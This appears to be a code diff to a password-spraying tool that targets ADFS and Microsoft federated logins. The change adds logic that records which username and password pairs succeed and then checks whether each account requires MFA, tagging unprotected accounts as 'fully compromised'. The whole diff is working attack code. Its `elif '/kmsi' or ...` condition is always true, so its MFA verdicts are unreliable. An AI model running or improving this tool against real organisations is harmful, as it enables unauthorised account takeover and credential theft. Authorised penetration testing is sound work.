@@ -139,6 +139,8 @@ def send_login_request(
     check_mfa=False,
     proxy=None,
 ):
+    microsoft_checks_mfa = False
+    adfs_checks_mfa = False
     if verbose:
         log_message(f"[*] Trying login for {username}", log_file, color=Fore.WHITE)
 
@@ -164,23 +166,39 @@ def send_login_request(
                 data=payload,
                 headers=headers,
                 timeout=10,
+                allow_redirects=False,
             )
             adfs_login_response.raise_for_status()
             if (
                 adfs_login_response.status_code == 200
                 and 'action="https://login.microsoftonline.com:443/login.srf"'
                 in adfs_login_response.text
-            ) or (
-                adfs_login_response.status_code == 302
-                and target in adfs_login_response.headers.get("Location", "")
             ):
+                microsoft_checks_mfa = True
                 log_message(
                     f"[+] Login success: {username} : {password}",
                     log_file,
                     color=Fore.GREEN,
                 )
+            elif (
+                adfs_login_response.status_code == 302
+                and target in adfs_login_response.headers["Location"]
+            ):
+                adfs_checks_mfa = True
+                log_message(
+                    f"[+] Login success: {username} : {password}",
+                    log_file,
+                    color=Fore.GREEN,
+                )
+            elif verbose:
+                log_message(
+                    f"[-] Login failed: {username} : {password}",
+                    log_file,
+                    color=Fore.RED,
+                )
 
-                if check_mfa:
+            if check_mfa:
+                if microsoft_checks_mfa:
                     wresult_value = extract_saml_assertion(adfs_login_response)
                     if wresult_value:
                         login_srf_url = "https://login.microsoftonline.com/login.srf"
@@ -222,12 +240,36 @@ def send_login_request(
                                 print(
                                     f"{Fore.RED}[!] Unknown response checking MFA.{Style.RESET_ALL}"
                                 )
-            elif verbose:
-                log_message(
-                    f"[-] Login failed: {username} : {password}",
-                    log_file,
-                    color=Fore.RED,
-                )
+                elif adfs_checks_mfa:
+                    adfs_mfa_response = session.get(
+                        adfs_login_response.headers["Location"],
+                        headers=headers,
+                        timeout=10,
+                    )
+                    adfs_mfa_response.raise_for_status()
+
+                    if adfs_mfa_response.status_code == 200:
+                        if "mfa" in adfs_mfa_response.text:
+                            log_message(
+                                f"[-] MFA required for: {username}",
+                                log_file,
+                                color=Fore.RED,
+                            )
+                        elif "/kmsi" or "KmsiInterrupt" in adfs_mfa_response.text:
+                            log_message(
+                                f"[+] MFA not required for: {username}",
+                                log_file,
+                                color=Fore.GREEN,
+                            )
+                            log_message(
+                                f"[+] 🍾 {username} is fully compromised 🤌",
+                                log_file,
+                                color=Fore.MAGENTA,
+                            )
+                        else:
+                            print(
+                                f"{Fore.RED}[!] Unknown response checking MFA.{Style.RESET_ALL}"
+                            )
 
     except requests.exceptions.Timeout:
         print(f"{Fore.RED}[!] Request timed out.{Style.RESET_ALL}")
